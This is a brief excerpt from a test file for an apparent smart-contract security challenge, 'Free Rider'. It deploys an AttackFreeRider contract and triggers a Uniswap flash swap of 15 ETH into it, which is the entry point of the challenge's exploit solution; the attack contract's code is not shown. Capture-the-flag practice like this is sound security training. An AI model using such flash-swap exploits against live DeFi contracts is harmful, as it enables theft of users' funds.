...
describe('[Challenge] Free Rider', function () {
  ...
  it('Execution', async function () {
    ...
    const attackContract = await (
      await ethers.getContractFactory('AttackFreeRider')
    ).deploy(uniswapFactory.address, marketplace.address, devsContract.address, weth.address);

    await uniswapPair.connect(player).swap(parseEther('15'), 0, attackContract.address, '0x1111');
  });
